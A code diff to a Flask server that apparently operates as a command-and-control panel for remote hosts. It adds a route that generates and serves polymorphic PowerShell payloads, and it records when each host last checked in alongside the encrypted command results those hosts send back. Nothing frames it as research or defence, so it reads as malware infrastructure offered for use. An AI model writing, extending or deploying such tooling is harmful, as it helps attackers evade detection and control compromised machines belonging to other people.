@@ -9,8 +9,10 @@ import os
 import base64
 import json
 import sys
+from flask import send_from_directory
 from datetime import datetime, UTC
 
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
 try:
     with open(os.path.join(os.path.dirname(__file__), '..', 'config.json')) as f:
@@ -344,6 +346,13 @@ def upload():
 
     return render_template("upload.html")
 
+@app.route('/generate_ps_payload', methods=['GET'])
+@login_required
+def generate_ps_payload():
+    from tools.ps_builder import generate_polymorphic_ps
+    filename = generate_polymorphic_ps()
+    return send_from_directory('payloads', filename)
+
 
 @socketio.on('connect')
 def handle_connect():
@@ -360,6 +369,7 @@ def handle_register(encrypted_data):
 def handle_result(encrypted_data):
     data = json.loads(aes_decrypt(encrypted_data))
     hostname = data.get("hostname")
+    last_seen[hostname] = time.time()
     command = data.get("command")
     result = data.get("result")
 
